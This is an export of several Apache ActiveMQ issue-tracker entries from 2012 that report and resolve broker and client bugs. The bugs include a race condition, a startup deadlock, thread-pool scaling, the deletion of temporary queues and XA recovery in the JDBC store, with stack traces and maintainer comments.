Body Preview of BytesMessages change when browsed multiple times from QueueViewMbean,AMQ-3889,12595083,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kaaveland,kaaveland,19/Jun/12 10:15,02/Oct/12 04:15,14/Jul/23 05:43,19/Jun/12 15:33,5.5.1,,,,,5.7.0,,,JMX,,,,1,,,,,,,,,"When using the browse method of org.apache.activemq.broker.jmx.QueueViewMBean to obtain CompositeData of messages, the Body Preview of BytesMessages changes between each browse.

I am not sure if that is intended behaviour, but I have written a testcase that illustrates it. 

I have also narrowed it down to org.apache.activemq.broker.jmx.OpenTypeSupport.BytesMessageOpenTypeFactory, which uses ActiveMQBytesMessage.readBytes but does not call reset afterwards.","Linux 64-bit, multiple java versions.",andreaja,kaaveland,tabish,z80pio,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jun/12 10:22;kaaveland;OpenTypeSupport.diff;https://issues.apache.org/jira/secure/attachment/12532523/OpenTypeSupport.diff","19/Jun/12 10:19;kaaveland;OpenTypeSupportTest.java;https://issues.apache.org/jira/secure/attachment/12532521/OpenTypeSupportTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249813,,,Tue Oct 02 04:15:02 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahnr:",59134,,,,,,,,,,,,,,,,,,,,,"19/Jun/12 10:19;kaaveland;Testcase to reproduce issue.;;;","19/Jun/12 10:22;kaaveland;Resolves this issue.;;;","19/Jun/12 15:33;tabish;Fix applied in trunk with thanks. ;;;","01/Oct/12 18:48;z80pio;Hi,  I see the same issue.  What should I do to get the patch, please let me know the details.

-Sathish;;;","01/Oct/12 18:59;tabish;ActiveMQ 5.7.0 is undergoing the release process now.  You can wait a few days for that or grab one of the nightly SNAPSHOT builds.;;;","02/Oct/12 04:15;z80pio;Thanks for your quick response.    My aim to create a external tool using JMX that will monitor few ActiveMQ Queues periodically and peek(browse) into certain non-well formed messages and raise alerts.

Few questions, if you can answer, will help me a lot.
1) Is there a workaround available for this?  
2) Is this an issue with activeMQ JMX agent service?  The upcoming patch to be applied to activeMQ service?
3) I guess even though the browse shows message with null characters(after couple of browsing on the same message), read message actually fetches the message properly, please confirm if this is correct.  

Thanks
Sathish;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Occasional Null Pointer Exception during NetworkConnector connection,AMQ-3887,12594957,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,ron.koerner,ron.koerner,18/Jun/12 16:02,21/Aug/12 11:26,14/Jul/23 05:43,21/Aug/12 10:31,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"While starting a duplex NetworkConnector an NPE can be observed on the receiving side.

{code}
2012-06-18 17:34:24,571 INFO  .DemandForwardingBridgeSupport - Network connection between vm://proxy-cbpi001#8 and tcp:///169.254.
0.5:59412(cbox-56BU101117) has been established. [StartLocalBridge: localBroker=vm://proxy-cbpi001#8]
2012-06-18 17:34:24,577 WARN  .DemandForwardingBridgeSupport - Caught an exception processing local command [BrokerService[proxy-c
bpi001] Task-19]
java.lang.NullPointerException: null
        at org.apache.activemq.network.DemandForwardingBridgeSupport.configureMessage(DemandForwardingBridgeSupport.java:644) ~[ac
tivemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:675) ~
[activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:139) [activemq
-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:135) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:124) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:103) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837) [activemq-core-5.6.0.jar:5
.6.0]
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:872) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) [activemq-core-5.6.0.jar:5.6.0]
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) [activemq-core-5.6.0.jar:5.6.0]
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source) [na:1.6.0_20]
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [na:1.6.0_20]
        at java.lang.Thread.run(Unknown Source) [na:1.6.0_20]
{code}

The other broker will eventually connect, but with about a hundred of connecting brokers this occurs too often to ignore.

As this seems to be a race condition it is quite difficult to reproduce reliably. I assume producerInfo is accessed in configureMessage before it is initialized in startRemoteBridge.",SLES 10,donnchadh,gtully,ron.koerner,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246252,,,Tue Aug 21 11:26:35 UTC 2012,,,,,,,,,,,"0|i07jbb:",41896,,,,,,,,,,,,,,,,,,,,,"20/Jun/12 14:57;tabish;Fix applied on trunk.;;;","13/Jul/12 13:26;ron.koerner;With the latest 5.7-SNAPSHOT the problem is still there:

{code}
2012-07-13 15:02:25,987 INFO  .DemandForwardingBridgeSupport - Network connection between vm://smcufs02#32 and tcp:///127.0.0.1:43274(cbox-000000005300653612) has been established. [StartLocalBridge: localBroker=vm://smcufs02#32]
2012-07-13 15:02:25,988 INFO  emq.broker.TransportConnection - Started responder end of duplex bridge cBox 000000005300653612 to cBox Proxy@ID:000000005300653612-48838-1341420908942-0:1 [ActiveMQ NIO Worker 1]
2012-07-13 15:02:25,989 INFO  .ConnectorAuthenticationBroker - checked login of checkit:xdev-000000005300653612 [ActiveMQ NIO Worker 1]
2012-07-13 15:02:26,021 WARN  .DemandForwardingBridgeSupport - Caught an exception processing local command [BrokerService[smcufs02] Task-147]
java.lang.NullPointerException: null
        at org.apache.activemq.network.DemandForwardingBridgeSupport.configureMessage(DemandForwardingBridgeSupport.java:673) ~[activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:707) ~[activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:165) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAP
SHOT]
        at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:137) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:126) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:103) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:872) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) [activemq-core-5.7-SNAPSHOT.jar:5.7-SNAPSHOT]
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [na:1.6.0_20]
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [na:1.6.0_20]
        at java.lang.Thread.run(Thread.java:619) [na:1.6.0_20]
{code};;;","13/Jul/12 15:35;tabish;I'd recommend that you try and crate a JUnit test case to show how this is happening.;;;","18/Jul/12 11:36;ron.koerner;I tried, but it seems the problem only manifests in a live system.
Anyway, I think it is a race condition introduced by the following facts

* {{DemandForwardingBridgeSupport.start}}
** synchronously connects the {{local/remoteBroker}} Transports to {{serviceLocal/RemoteCommand}}
** asynchronously runs {{startRemoteBride}}
* someone sends a messageDispatch command to {{localBroker}} (whenever, maybe even before DFBS.start)
* [BrokerService[smcufs02] Task-147] delivers the message after {{DemandForwardingBridgeSupport.start}} 
** to {{DemandForwardingBridgeSupport.serviceLocalCommand}}
** which calls {{configureMessage}} which uses {{producerInfo}} which is not yet set
** and {{startLocalBridge}} may not even be started yet
* {{startRemoteBridge}}
** eventually creates {{producerInfo}}

I don't think {{serviceLocalCommand}} should handle message dispatches before the bridge is completely started. Therefore a {{waitStarted()}} after {{if (command.isMessageDispatch())}} in {{serviceLocalCommand}} should solve the problem.

It is to note that {{serviceRemoteCommand}} already includes a {{waitStarted()}} for message dispatches.

Maybe both methods should make a checked for {{disposed}} after waiting. They do check at the beginning, but if {{waitStarted}} really blocks, that may change in the meantime.
;;;","18/Jul/12 13:43;tabish;Have you tried these changes on a build of ActiveMQ?  Without a test case we have no way of knowing whether this fixes anything, so if you want to create a SNAPSHOT build locally and try out you ideas that would be a start. ;;;","18/Jul/12 23:47;tabish;I'd ask that you at least attach your Broker configuration so that if someone wants to take a stab at creating a unit test for this they will know what your setup is. ;;;","19/Jul/12 09:37;ron.koerner;My broker configuration contains some proprietary code which enables us to allow local connections for everyone, but remote connections need to be authenticated. I'll probably have to ask our legal department if I'm allowed to open source these.
I built a SNAPSHOT with {{waitStarted()}} and will monitor the behaviour.;;;","21/Aug/12 09:55;gtully;fyi: I have seen this exception on occasion with: org.apache.activemq.network.BrokerNetworkWithStuckMessagesTest#testBrokerNetworkWithStuckMessages;;;","21/Aug/12 10:31;gtully;fix in http://svn.apache.org/viewvc?rev=1375459&view=rev

essentially the wait till the remote setup is complete before responding to a local dispatch.;;;","21/Aug/12 10:48;ron.koerner;That seems to help.
Anyway, I think there is another lurking bug. When safeWaitUntilStarted() returns because of disposed.get() is true it is the same as when it returns because of the latch was unblocked.
Wherever safeWaitUntilStarted() is used should be a check afterwards whether disposed.get() is true and act accordingly.
Otherwise, thanks for your help.;;;","21/Aug/12 11:26;gtully;@Ron, the 'safety' aspect of safeWaitUntilStarted is that it won't block forever in the event of a failure of one of the transports. Any subsequent failure will result in the exception handling stopping the bridge. We can keep an eye on that, thanks for the feedback.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ java client doesn't scale to thousands of queues,AMQ-3885,12593956,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,mzruya,mzruya,17/Jun/12 12:59,20/Jul/12 14:53,14/Jul/23 05:43,20/Jul/12 14:47,5.6.0,,,,,5.7.0,,,Connector,,,,0,ActiveMQConnection,client,java,TaskRunnerFactory,,,,,"The ActiveMQ broker scales to tens of thousands of queues easily when using -Dorg.apache.activemq.UseDedicatedTaskRunner=false (false by default).

A problem actually arises in the java client side, when a client is listening to X queues using 1 connection and Y sessions per queue, using a JMS message listener, X * Y threads will be created, when X * Y is not bounded,

This is because each ActiveMQConnection object holds a TaskRunnerFactory which in turn has a ThreadPoolExecutor, the max pool size of the executor is defined to be Integer.MAX_VALUE, with the combination of a SynchronousQueue it creates as many threads as it pleases.

the behavior of the executor is dependent on min pool size, core pool size, queue impl and rejection policy 

a few options to handle this :
1. the default rejection policy throws an exception which is not handled,
ThreadPoolExecutor.CallerRunsPolicy sounds better then the default

2. Change the queue impl to LinkedBlockingQueue and change the core pool size to a bounded value

3. Provide the means to supply an external executor to be shared in the app",core i7 laptop running win7 64bit with 8gb of ram,dejanb,mzruya,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246246,,,Fri Jul 20 14:47:37 UTC 2012,,,,,,,,,,,"0|i07j9r:",41889,,,,,,,,,,,,,,,,,,,,,"20/Jul/12 14:47;dejanb;Fixed with svn revision 1363790

The client thread pool is now limited to 1000 by default and it could be further tuned with 

{code}ActiveMQConnectionFactory.setMaxThreadPoolSize(){code}

You can also provide a completely custom task runner factory using

{code}ActiveMQConnectionFactory.setSessionTaskRunner(){code}

As for the rejection policy, we decided to let it as is since it's appropriate to raise an exception when you reach your limits, so that things can be tuned further.

We also left SingleQueue as LinkedBlockingQueue is unbounded which can cause problems on its own.

Current changes should be enough to make clients scale.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker should not send advisories for slow consumers or fast producers if the destination in question is an advisory destination already.,AMQ-3882,12560700,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,14/Jun/12 23:25,15/Jun/12 12:56,14/Jul/23 05:43,15/Jun/12 12:56,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,The code in the AdvisoryBroker class that sends out the advisory for slow consumer and fast producer doesn't check the destination of those producers and consumers to see if they themselves are advisory destinations.  This could lead to some undesirable side effects based on how those advisories are being handled.  ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249814,,,Fri Jun 15 12:56:39 UTC 2012,,,,,,,,,,,"0|i0ahnz:",59135,,,,,,,,,,,,,,,,,,,,,"15/Jun/12 12:56;tabish;This is fixed now on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 Handy diagnostic script for troubleshooting ActiveMQ problems,AMQ-3881,12560673,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,14/Jun/12 18:31,28/Jun/12 15:59,14/Jul/23 05:43,28/Jun/12 15:59,,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,useful script contributed by a user that pulls together os diagnostic utility output into a single archive. Useful for remote troubleshooting.,sunos linux,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jun/12 18:34;gtully;diag;https://issues.apache.org/jira/secure/attachment/12532123/diag",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249815,,,Thu Jun 28 15:59:31 UTC 2012,,,,,,,,,,,"0|i0aho7:",59136,,,,,,,,,,,,,,,,,,,,,"14/Jun/12 18:34;gtully;bash script to capture host diagnostics around the broker java process;;;","14/Jun/12 18:42;gtully;just wondering where to put this. ./bin/diag, maybe ./contrib is needed till it evolves into something sh based that can work across the board.;;;","14/Jun/12 21:00;tabish;Maybe in contrib to help indicate its not fully supported and can use more input / testing.  ;;;","28/Jun/12 15:59;gtully;tidied up the script so that it runs with !/bin/sh and in particular sh on sunos and ksh on aix;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Temporary queues may be deleted by the wrong connection,AMQ-3879,12560394,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,dkulp,dkulp,12/Jun/12 20:14,02/May/13 02:30,14/Jul/23 05:43,12/Jun/12 23:06,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"
While trying to upgrade CXF from 5.4.2 to 5.6, I ran into a slight problem.  The fix for AMQ-3038 seems to have caused an issue where closing a connection that has been given an advisory of a temporary queue (AdvisoryConsumer) will result in the temporary queue being delete even if the connection that NEEDS the queue is still using it.

Chatted with gtully a bit:

http://irclogs.dankulp.com/logs/irclogger_log/activemq?date=2012-06-12,Tue&sel=112#l108

This can be reproduced with a CXF checkout (2.6.x-fixes branch) by updating parent/pom.xml to use activemq 5.6 and running the test in rt/transport/jms.   The MessageIdAsCorrelationIdJMSConduitTest  test fails.


A workaround is to use a PooledConnectionFactory instead of the ActiveMQConnectionFactory.   I'll be committing that workaround to trunk so the problem will not be re-producible there.

",,dkulp,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4196,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249817,,,Fri Jun 15 18:45:28 UTC 2012,,,,,,,,,,,"0|i0ahon:",59138,,,,,,,,,,,,,,,,,,,,,"12/Jun/12 20:33;gtully;note to self: A test case that uses two connections, creates a temp on one and a consumer. verify the advisory propagation via waiting for a failure to delete. then close the second, should get a failed send to the temp.;;;","12/Jun/12 23:06;tabish;Fix and test for this issue.;;;","15/Jun/12 18:08;dkulp;
Another note for reference:
The ActiveMQInitialContextFactory only create ActiveMQConnectionFactories (not pooled) and thus is affected by this.   This basically means that using JNDI to configure/setup ActiveMQ results in factories/connections that have problems working with the temporary queues.    No possible workaround without writing their own InitialContextFactory to handle pooled.   Not ideal.
;;;","15/Jun/12 18:45;gtully;A workaround is to use watchTopicAdvisories=false on the connection factory.
?jms.watchTopicAdvisories=false on the brokerUrl will do that for you.
In this way, the temp will only be known to the connection that creates it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Occasional deadlock during startup,AMQ-3873,12558976,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ron.koerner,ron.koerner,01/Jun/12 17:06,15/Jun/12 15:35,14/Jul/23 05:43,15/Jun/12 15:35,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"During startup I occasionally get deadlocks. I never had those on earlier versions including a 5.6-SNAPSHOT from January.

My activemq.xml contains a number of beans which each autowire the BrokerService and make connections to brokerService.getVmConnectorURI().toString()+""?async=false""

To avoid beans to be started faster than the broker and create a second broker by trying to connect, the broker is instantiated with start=false and a special bean listening for the Spring ContextRefreshedEvent will start the broker and run each beans connection methods.

Therefore a number of VmConnections will be done serially but in a rapid succession.

This fails at different points, but always with the following thread lock analysis:

{code}
Found one Java-level deadlock:
=============================
""ActiveMQ Task-3"":
  waiting for ownable synchronizer 0x9f288120, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),
  which is held by ""BrokerService[smcufs02] Task-1""
""BrokerService[smcufs02] Task-1"":
  waiting to lock monitor 0x0807a650 (object 0x9f2880d8, a java.util.concurrent.atomic.AtomicBoolean),
  which is held by ""ActiveMQ Task-3""

Java stack information for the threads listed above:
===================================================
""ActiveMQ Task-3"":
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x9f288120> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:778)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1114)
        at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
        at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837)
        at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:798)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
        at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:135)
        at org.apache.activemq.transport.vm.VMTransport.start(VMTransport.java:156)
        - locked <0x9f2880d8> (a java.util.concurrent.atomic.AtomicBoolean)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
        at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:914)
        - locked <0x9f2e4f98> (a org.apache.activemq.broker.TransportConnection)
        at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:227)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
""BrokerService[smcufs02] Task-1"":
        at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:114)
        - waiting to lock <0x9f2880d8> (a java.util.concurrent.atomic.AtomicBoolean)
        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:103)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1307)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:837)
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:872)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)

Found 1 deadlock.
{code}
","Suse Linux, CentOS Linux
Out-of-the-Box standalone broker with additional beans",ron.koerner,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249820,,,Fri Jun 15 15:35:49 UTC 2012,,,,,,,,,,,"0|i0ahpb:",59141,,,,,,,,,,,,,,,,,,,,,"14/Jun/12 15:02;tabish;Would be great if you could work up a JUnit test that can get it into this tangle.  Would help to work out a solution. ;;;","15/Jun/12 14:00;ron.koerner;I'll try to find time. Currently a one-second delay between connections seems to be a workaround, but it is certainly no solution.;;;","15/Jun/12 15:03;tabish;Believe I have a test case that reproduces this one now. ;;;","15/Jun/12 15:35;tabish;Applied the fix and added a test case that reproduced this locking issue. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Implement ""exactly once"" delivery with JDBC and XA in the event of a failure post prepare",AMQ-3872,12558941,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,01/Jun/12 11:23,01/Jun/12 14:39,14/Jul/23 05:43,01/Jun/12 14:39,5.6.0,,,,,5.7.0,,,Message Store,,,,0,JDBC,MessageStore,recovery,XA,,,,,"JDBC store does not honor the prepare phase so a broker failure after prepare always results in a rollback which is in violation of the contract.
In the cases where XA is required, the store needs to do its best to respect a prepare outcome.
Having the TM use last resource commit one phase (or the one phase commit optimisation) avoids this issue but is not always possible.","jdbc persistence adapter, XA",gtully,sbrandt,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3305,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246244,,,Fri Jun 01 14:39:21 UTC 2012,,,,,,,,,,,"0|i07j9j:",41888,,,,,,,,,,,,,,,,,,,,,"01/Jun/12 11:24;gtully;link to corresponding kahaDB issue, kahaDB needs some work for the durable sub case.;;;","01/Jun/12 14:39;gtully;fix in http://svn.apache.org/viewvc?rev=1345202&view=rev

JDBC 2PC is now two JDBC ops, an insert/update in prepare and an update for the outcome.
An additional xid column is needed in both the acks and messages table. A non null value for the xid means that the update is pending the outcome of the xa transaction matching that xid.
Recovery scans for non null xid and recreates the appropriate state pending the outcome.
